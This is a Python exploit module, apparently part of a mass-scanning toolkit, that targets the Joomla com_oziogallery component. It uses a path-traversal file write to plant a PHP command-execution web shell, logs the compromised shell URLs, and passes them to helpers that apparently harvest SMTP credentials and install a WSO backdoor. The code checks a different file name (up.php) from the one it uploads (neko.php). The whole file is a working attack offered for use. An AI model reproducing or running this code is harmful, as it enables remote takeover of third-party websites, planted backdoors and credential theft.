# coding=utf-8
import requests
import printModule
import getSMTP
import wsoShellUploaderModule

payloadshell = '"neko!!<?php {});?>"'.format("system({}".format('$_GET["cmd"]'))
Headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'
}

def Exploit(site):
    try:
        PostData = {'path': '../../../tmp/'}
        fil = {'raw_data': ('neko.php', payloadshell, 'text/html')}
        requests.post('http://' + site + '/components/com_oziogallery/imagin/scripts_ralcr/filesystem'
                                         '/writeToFile.php', files=fil, data=PostData, headers=Headers, timeout=10)
        CheckShell = requests.get('http://' + site + '/tmp/up.php', headers=Headers, timeout=10)
        if 'neko!!' in str(CheckShell.content):
            with open('result/Shell_results.txt', 'a') as writer:
                writer.write(site + '/tmp/neko.php?cmd=uname -a' + '\n')
            getSMTP.JooomlaSMTPshell(site + '/tmp/neko.php?cmd=id')
            WSo = wsoShellUploaderModule.UploadWso(site + '/tmp/neko.php?cmd=id')
            if WSo == 'No':
                pass
            else:
                with open('result/WSo_Shell.txt', 'a') as Wr:
                    Wr.write('{}\n'.format(WSo))
            return printModule.returnYes(site, 'N/A', 'Com_oziogallery', 'Joomla')
        else:
            return printModule.returnNo(site, 'N/A', 'Com_oziogallery', 'Joomla')
    except:
        return printModule.returnNo(site, 'N/A', 'Com_oziogallery', 'Joomla')
